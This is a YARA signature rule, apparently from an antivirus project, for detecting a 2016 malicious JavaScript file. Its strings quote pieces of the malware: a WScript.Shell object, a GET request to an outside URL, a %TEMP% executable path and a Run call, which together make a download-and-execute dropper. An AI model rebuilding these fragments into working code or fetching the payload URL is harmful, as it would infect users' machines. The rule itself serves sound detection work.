rule sig_20160328_a552d59f49ba3bd9f3c3bbb6547fcb22 {
  meta:
    description = "datamaliciousorder - file 20160328_a552d59f49ba3bd9f3c3bbb6547fcb22.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a902cb5781b2b16fc2b9eb1b49c944df2ce22fe0be14a135a4309d8abb6f45aa"

  strings:
    $s1  = "function Rnglr() {return Xlukirr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"EeZLQmwm.exe\";};" fullword ascii
    $s2  = "do {WScript[Rfotzageqy](Swomtruae() * 11)} while (Wcqtyvif[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Agekokrzje(Nqjiazv, Ixuba){return Nqjiazv - Ixuba;};" fullword ascii
    $s4  = "Wcqtyvif[Kaurs](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "var Xlukirr = function Zcvnn() {return WScript[Xybeykvo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Oegbsm() {return ((Svuojthwzv == true) && (Svuojthwzv == Bclcde)) ? 1 : Pqxnly;};" fullword ascii
    $s7  = "function Ixcjfseyc(Flevp){Xlukirr[\"Run\"](Flevp, Pqxnly, Pqxnly);};" fullword ascii
    $s8  = "function Qpxude(){return Xybeykvo;};" fullword ascii
    $s9  = "function Foikgiju(){return Qqqwwrbo;};" fullword ascii
    $s10 = "Svuojthwzv = true; " fullword ascii
    $s11 = "var Ydvswnh = false;" fullword ascii
    $s12 = "function Dqoaln(Neqydxevd) {var Idsbctsf = (1, 2, 3, 4, 5, Neqydxevd); return Idsbctsf;};" fullword ascii
    $s13 = " while (Szqyknx){" fullword ascii
    $s14 = "Bclcde = true; " fullword ascii
    $s15 = "function Kvqqxyh()" fullword ascii
    $s16 = "var Svuojthwzv = false;" fullword ascii
    $s17 = "return Agekokrzje(Fffhqafyb, Udjufotqk);" fullword ascii
    $s18 = "var Nybfccfv = new this[\"Date\"]();" fullword ascii
    $s19 = "function Swomtruae(){return 22;};" fullword ascii
    $s20 = "var Bclcde = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}